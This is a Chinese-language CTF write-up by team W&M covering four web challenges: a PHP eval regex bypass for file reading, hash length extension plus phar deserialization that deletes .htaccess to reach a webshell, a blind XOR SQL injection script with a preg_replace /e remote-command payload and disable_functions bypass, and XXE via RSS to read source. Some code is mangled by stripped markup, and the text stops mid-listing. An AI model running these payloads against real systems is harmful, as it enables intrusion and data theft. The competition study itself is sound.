> Team: W&M
前排广告位：W&M长期招逆向/二进制/密码学/杂项/web选手，尤其是二进制和密码学选手,有意向的大佬欢迎砸简历到PI:EMAIL
# **Web：**
## boring_code
两个点
  * 域名需要包含baidu.com
  * 绕过正则和过滤将字符串传入eval中执行
**第一个点**  
队友财大气粗直接买了个域名，成功绕过。 （缓缓打出一个？  
**第二个点**  
正则只允许我们传入形如 a(b(c())) 的字符串，且最后一个括号内不能有参数。  
参考一叶飘零的总结 
但是这题加大了很多难度，过滤了这么些东西  
`/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/`  
没有et的话所有带get的都不能用了。想getshell几乎不可能了。  
再加上的提示。只需要达到文件读取就可以了。
先构造出一个可以读当前目录的payload  
`echo(readfile(end(scandir('.'))))`  
可以读取目录中最后一个文件。
现在需要构造一个能产生.的函数。找到这个函数 localeconv() ，会返回一个数组，数组第一项就是 "."  
那么用current(localeconv())取出第一项，发现nt被BAN了，翻手册找到了pos()函数，是current的别名。  
那么当前的payload  
`echo(readfile(end(scandir(current(localeconv())))))`  
但是flag目录在上层目录，需要用chdir跳转。可以chdir只会返回bool值。我们需要找一个函数接受布尔值并且可以输出"."  
想到了时间有关函数 time() localtime()，  
time(true)会返回当前时间戳，但是时间戳的值无法转变为想要的"."  
localtime()返回数组，可以提取出秒数的值，用chr转换为字符串"." 即在46s时 chr(pos(localtime()))就会返回"."  
但是localtime()内接受布尔参数会报错，陷入僵局。
继续翻手册发现了  
localtime第一参数默认是time() ，那我可以用localtime接受time函数，time接受一个bool值。
构造最终payload  
`echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));`
把(买的)域名指向到自己的服务器，服务器上放一个文件  
`echo
"echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"`  
然后发包去访问，需要简单爆破下，只有在时间为某分46秒时可以读到源码
## EZCMS
[www.zip](http://www.zip)拿到源码  
简单审计，明显的hash长度拓展攻击，老套路了。  
`username:admin`
`password:admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admina`  
登陆之后加上cookie fcb0b00520b914c23b9e95db070008ad
继续审计发现一个phar反序列化点。  
view.php中  
`$file = new File($file_name, $file_path);`  
跟进后filepath会进入mime_content_type函数。再加上我们可以控制上传文件的内容，达成一条反序列化链。  
两种攻击思路
  * 反序列化调用upload_file函数，上传到其他目录获取shell
  * 重写htaccess内容或者删掉htaccess
第一条路由于使用的是move_uploaded_file，会对tmp文件名检测，在不知道tmp名的情况下无法使用。  
走第二条路  
直接上反序列化构造脚本
    filepath = $filepath;
            $this->filename = $filename;
        }
    }
    class Profile{
        public $username;
        public $password;
        public $admin;
    }
    $a = new File("altman","altman");
    $a->checker = new Profile();
    $a->checker->username = "/var/www/html/sandbox/a87136ce5a8b85871f1d0b6b2add38d2/.htaccess";
    $a->checker->password = ZipArchive::OVERWRITE | ZipArchive::CREATE;
    $a->checker->admin = new ZipArchive();
    echo serialize($a);
    $phar = new Phar("1.phar");
    $phar->startBuffering();
    $phar->setStub(""); //设置stub
    $phar->setMetadata($a); 
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    $phar->stopBuffering();
    ?>
构造好后先上传一个简单马，需要绕过黑名单
然后将生成的phar上传，利用filter绕过对phar的过滤 （见suctf）  
`http://112.126.102.158:9999/view.php?filename=dd7ec931179c4dcb6a8ffb8b8786d20b.txt&filepath=php://filter/resource=phar://sandbox/a87136ce5a8b85871f1d0b6b2add38d2/dd7ec931179c4dcb6a8ffb8b8786d20b.txt`  
触发反序列化。删掉htaccess。此时切记不要访问upload.php，否则会重新生成htaccess。  
直接访问沙盒下第一个上传的php文件，拿到shell。
##
##
## babyblog
扫描目录可以发现[www.zip](http://www.zip)源码泄露。  
大概看了下，发现文章标题处存在二次注入  
config中泄露过滤函数，但是作用不大直接使用异或注入即可绕过  
``1'^(ascii(substr((select(group_concat(schema_name)) from
(information_schema.schemata)),1,1))>1)^'1`  
接下来写个脚本注入即可
    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-    import re
    import requests
    # 1'^(ascii(substr((select(group_concat(schema_name)) from (information_schema.schemata)),1,1))>1)^'1
    def main():
        get_all_databases("http://112.126.101.16:9999/")
    def http_get(url, payload):
        result = requests.post(url + "writing.php", data={'title': "1'^(" + payload + ")^'1", 'content': 'fuhei'}, headers={"Cookie": "PHPSESSID=cs04skbivc1g706vka0f76avt4"})
        result.encoding = 'utf-8'
        r2 = requests.get(url + "index.php", headers={"Cookie": "PHPSESSID=cs04skbivc1g706vka0f76avt4"})
        pattern = re.compile(r'edit.php\?id=(\d+)')
        result1 = pattern.findall(r2.text)
        result = requests.post(url + "edit.php", data={'title': "fuhei", 'content': 'fuhei', "id": result1[0]},
                               headers={"Cookie": "PHPSESSID=cs04skbivc1g706vka0f76avt4"})
        result.encoding = 'utf-8'
        result2 = requests.get(url + "edit.php?id=" + result1[0], headers={"Cookie": "PHPSESSID=cs04skbivc1g706vka0f76avt4"})
        print(result2.text.find('ascii') == -1)
        if result2.text.find('ascii') == -1:
            return True
        else:
            return False
    # 获取数据库
    def get_all_databases(url):
        db_name = ""
        db_payload = "select(group_concat(schema_name)) from (information_schema.schemata)"
        for y in range(1, 32):
            db_name_payload = "ascii(substr((" + db_payload + "),%d,1))" % (
                y)
            db_name += chr(half(url, db_name_payload))
            print(db_name)
        print("值为：%s" % db_name)
    # 二分法函数
    def half(url, payload):
        low = 0
        high = 126
        # print(standard_html)
        while low  %d" % (payload, mid)
            # print(mid_num_payload)
            # print(mid_html)
            if http_get(url, mid_num_payload):
                low = mid + 1
            else:
                high = mid - 1
        mid_num = int((low + high + 1) / 2)
        return mid_num
    if __name__ == '__main__':
    main()
然后根据题目意思来注入找到是vip的用户  
解密得到VIP用户 pppr/123  
继续审计发现replace.php中存在preg_replace函数，参数可控可导致命令执行  
    import requests
    import base64
    cookie={
        "PHPSESSID":"pe6c91i1bbks4k21r5endcfh41"
    }
    def write():
        url="http://112.126.101.16:9999/edit.php"
        data={
            "title":"glzjin",
            "content":'glzjin',
            "id":"2630"
        }
        r=requests.post(url=url,data=data,cookies=cookie)
        return r.content
    url = "http://112.126.101.16:9999/replace.php"
    #command = """eval('cmd = "/readflag";$out_path = "/tmp/altman";$evil_cmdline = $cmd . " > " . $out_path . " 2>&1";echo " cmdline: " . $evil_cmdline . "";putenv("EVIL_CMDLINE=" . $evil_cmdline);$so_path = "/tmp/de1ta.so";putenv("LD_PRELOAD=" . $so_path);error_log("", 1, "PI:EMAIL");echo " output: " . nl2br(file_get_contents($out_path)) . ""; unlink($out_path);')"""
    command = """eval("var_dump(scandir('/tmp'));")"""
    payload = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"regex\"\r\n\r\n1\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"find\"\r\n\r\nglzjin/e\x00\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\nglzjin\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"replace\"\r\n\r\n" +  command +"\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n2630\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
    headers = {
        'content-type': "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
        'Cookie': "PHPSESSID=pe6c91i1bbks4k21r5endcfh41",
        'cache-control': "no-cache",
        }
    write()
    response = requests.request("POST", url, data=payload, headers=headers)
print(response.text)
进去后发现大部分函数被disable_functions禁用了，而且无法跨出目录。于是看了下tmp目录发现存在de1ta.so，分析了下发现是GitHub开源的用来bypass
disable_functions用的。于是对照phpinfo发现没有禁用error_log，直接使用error_log进行bypass。
## RSS
1、打开靶机，看下功能，直接输入一个 rss，给解析出来。  
同时限制了读取的域名。  
2、那么这里就用 data:// 伪协议直接传数据进去试试，因为 php 对 data 的 mime type 不敏感，直接写成 baidu.com
就可以过这个 host 检测了。为了方便我这里传 base64 之后的。  
参考资料：  
测试没毛病。
3、别忘了 RSS 也是一种 XML，那么就存在 XXE 的问题，我们来试试。  
参考资料：
    ]>
        The Blog
        http://example.com/
        A blog about things
        Mon, 03 Feb 2014 00:00:00 -0000
            &xxe;
            http://example.com
            a post
            PI:EMAIL
            Mon, 03 Feb 2014 00:00:00 -0000
啊哈，出来了。  
4、那么接下来就来读取站点源码试试，注意有尖括号我们需要套一下 php伪协议，转成 base64。
    ]>
        The Blog
        http://example.com/
        A blog about things
        Mon, 03 Feb 2014 00:00:00 -0000
            &xxe;
            http://example.com
            a post
            PI:EMAIL
            Mon, 03 Feb 2014 00:00:00 -0000
5、读取结果 base64 解码一下，得到 index.php 源码。
    ]>
    ]>
    <?php
    class Admin extends Controller{
        public static function sort($url,$order){
            $rss=file_get_contents($url);
            $rss=simplexml_load_string($rss,'SimpleXMLElement', LIBXML_NOENT);
            require_once './views/Admin.php';
        }